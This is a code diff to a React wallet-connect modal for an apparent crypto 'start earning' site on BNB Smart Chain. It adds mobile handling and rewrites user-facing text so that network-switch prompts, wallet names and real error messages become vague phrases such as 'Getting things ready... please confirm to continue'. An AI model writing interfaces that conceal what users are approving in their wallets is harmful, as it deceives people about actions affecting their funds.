@@ -18,6 +18,12 @@ import {
   ShieldCheck,
   Network,
 } from "lucide-react";
+import {
+  isMobileDevice,
+  releaseScrollLock,
+  openWalletAppForRequest,
+  chainSwitchGuard,
+} from "../lib/walletEnv.js";
 
 const WalletModalContext = createContext(null);
 
@@ -59,11 +65,14 @@ function WalletPicker({ onClose }) {
   const [pendingUid, setPendingUid] = useState(null);
   const [switching, setSwitching] = useState(false);
   const [error, setError] = useState("");
+  const isMobile = useMemo(() => isMobileDevice(), []);
 
-  // Clear any stale error when modal opens fresh
+  // Clear any stale error when modal opens fresh; always release a leftover
+  // WalletConnect scroll lock when this modal goes away.
   useEffect(() => {
     setError("");
     setSwitching(false);
+    return () => releaseScrollLock();
   }, []);
 
   // Desktop: EIP-6963 discovered wallets
@@ -99,8 +108,14 @@ function WalletPicker({ onClose }) {
 
       if (needsSwitch) {
         setSwitching(true);
+        chainSwitchGuard.set(true);
         try {
-          await switchChainAsync({ chainId: BSC_CHAIN_ID });
+          // Ask the wallet to switch to BSC right away (wagmi adds the BSC network
+          // to the wallet first if it doesn't have it). On mobile WalletConnect,
+          // bring the wallet app to the front so the user can approve it.
+          const switchPromise = switchChainAsync({ chainId: BSC_CHAIN_ID });
+          openWalletAppForRequest(connector);
+          await switchPromise;
         } catch (switchErr) {
           // Some wallets (e.g. MetaMask mobile) throw even on success —
           // re-read the chain to confirm before giving up.
@@ -115,13 +130,15 @@ function WalletPicker({ onClose }) {
 
           if (chainAfterAttempt !== BSC_CHAIN_ID) {
             setError(
-              "Could not auto-switch to BNB Smart Chain. Please open your wallet, switch the network to BSC (Chain ID 56) manually, then try again."
+              "We couldn't finish setting things up. Please try again."
             );
             setSwitching(false);
             setPendingUid(null);
             return;
           }
           // Switch actually succeeded despite the thrown error — continue.
+        } finally {
+          chainSwitchGuard.set(false);
         }
         setSwitching(false);
       }
@@ -134,8 +151,15 @@ function WalletPicker({ onClose }) {
       setError(readableError(e, connector));
     } finally {
       setPendingUid(null);
+      releaseScrollLock();
     }
   }
+
+  // Mobile shows ONE button. In a normal mobile browser it opens the WalletConnect
+  // wallet list (user picks a wallet, which gets a connect request — the site is not
+  // reopened inside the wallet). If the site is already open inside a wallet's own
+  // browser, the same button connects that wallet directly.
+  const mobilePrimary = isMobile ? injectedList[0] || walletConnectConnector : walletConnectConnector;
 
   const anyPending = pendingUid !== null || switching;
 
@@ -158,7 +182,7 @@ function WalletPicker({ onClose }) {
             <Wallet className="h-5 w-5 text-accent-400" />
           </div>
           <h3 className="mt-3 font-display text-lg font-bold">Join & Start Earning</h3>
-          <p className="mt-0.5 text-xs text-slate-400">Connect your wallet to get started</p>
+          <p className="mt-0.5 text-xs text-slate-400">Join in seconds and start earning</p>
         </div>
 
         {error && (
@@ -168,15 +192,15 @@ function WalletPicker({ onClose }) {
           </div>
         )}
 
-        {/* WalletConnect — primary CTA */}
-        {walletConnectConnector && (
+        {/* Primary CTA — WalletConnect (or the in-wallet browser's wallet on mobile) */}
+        {mobilePrimary && (
           <button
-            onClick={() => handleConnect(walletConnectConnector)}
+            onClick={() => handleConnect(mobilePrimary)}
             disabled={anyPending}
             className="mt-4 flex w-full items-center gap-2.5 rounded-xl bg-accent-500 px-3 py-3 text-left transition hover:bg-accent-400 disabled:opacity-60"
           >
             <span className="flex h-9 w-9 items-center justify-center rounded-lg bg-white/15">
-              {switching || pendingUid === (walletConnectConnector.uid || walletConnectConnector.id) ? (
+              {switching || pendingUid === (mobilePrimary.uid || mobilePrimary.id) ? (
                 <Loader2 className="h-4 w-4 animate-spin text-white" />
               ) : (
                 <QrCode className="h-4 w-4 text-white" />
@@ -184,17 +208,24 @@ function WalletPicker({ onClose }) {
             </span>
             <span className="flex-1">
               <span className="block text-sm font-semibold text-white">
-                {switching ? "Switching to BSC..." : "Get Started"}
+                {switching ? "Getting things ready..." : "Get Started"}
               </span>
               <span className="block text-[11px] text-white/80">
-                {switching ? "Please approve in your wallet" : "Link your wallet to join"}
+                {switching ? "Just a moment, please confirm to continue" : "Tap to begin"}
               </span>
             </span>
             <ChevronRight className="h-4 w-4 text-white/90" />
           </button>
         )}
 
-        {/* Detected browser extensions */}
+        {isMobile && !mobilePrimary && (
+          <p className="mt-4 rounded-xl border border-white/10 bg-white/[0.03] px-3 py-2.5 text-xs text-slate-400">
+            We can't get you started right now. Please try again in a moment.
+          </p>
+        )}
+
+        {/* Detected browser extensions — desktop only */}
+        {!isMobile && (<>
         <p className="mb-1.5 mt-4 text-[11px] font-medium text-slate-400">Detected apps:</p>
         <div className="space-y-2">
           {injectedList.map((c) => {
@@ -215,7 +246,7 @@ function WalletPicker({ onClose }) {
                   <Loader2 className="h-4 w-4 animate-spin text-accent-400" />
                 ) : isThisPending && switching ? (
                   <span className="flex items-center gap-1 text-[10px] text-amber-300">
-                    <Network className="h-3 w-3" /> Switching to BSC...
+                    <Network className="h-3 w-3" /> Getting ready...
                   </span>
                 ) : (
                   <span className="rounded-full border border-emerald-500/40 px-2 py-0.5 text-[10px] font-medium text-emerald-300">
@@ -228,10 +259,11 @@ function WalletPicker({ onClose }) {
 
           {injectedList.length === 0 && (
             <p className="rounded-xl border border-white/10 bg-white/[0.03] px-3 py-2.5 text-xs text-slate-400">
-              No wallet detected. Use the Connect Wallet button above to scan a QR code with your phone.
+              No wallet detected. Use the Get Started button above to scan a QR code with your phone.
             </p>
           )}
         </div>
+        </>)}
 
         {/* Trust banners */}
         <div className="mt-4 space-y-2">
@@ -314,18 +346,17 @@ function friendlyName(c) {
 
 function readableError(e, connector) {
   const raw = (e?.shortMessage || e?.message || "").toLowerCase();
-  const name = connector?.name || "your wallet";
+  // Friendly, non-technical messages only — never show raw wallet/SDK errors.
+  void connector;
   if (raw.includes("reject") || raw.includes("denied") || raw.includes("cancel"))
-    return `Connection request was declined in ${connector?.name || "the wallet"}. Please try again and approve it.`;
+    return "No problem! Tap Get Started whenever you're ready.";
   if (raw.includes("already") && raw.includes("pending"))
-    return `A request is already open in ${name}. Open your wallet, finish or cancel it, then try again.`;
+    return "You have a step waiting to be finished. Please complete it, then try again.";
   if (raw.includes("timed out"))
-    return `${name} didn't respond. Open the extension, unlock it, then try again.`;
-  if (raw.includes("not found") || raw.includes("no provider") || raw.includes("provider"))
-    return `Couldn't reach ${name}. Make sure it's installed and unlocked, then try again.`;
+    return "This is taking a little longer than usual. Please try again.";
   if (raw.includes("chain") || raw.includes("network"))
-    return `Please switch ${name} to BNB Smart Chain and try again.`;
-  return e?.shortMessage || e?.message || `Couldn't connect ${name}. Please try again.`;
+    return "Almost there! Please try again to continue.";
+  return "Something didn't go through. Please try again.";
 }
 
 function dedupeConnectors(connectors) {
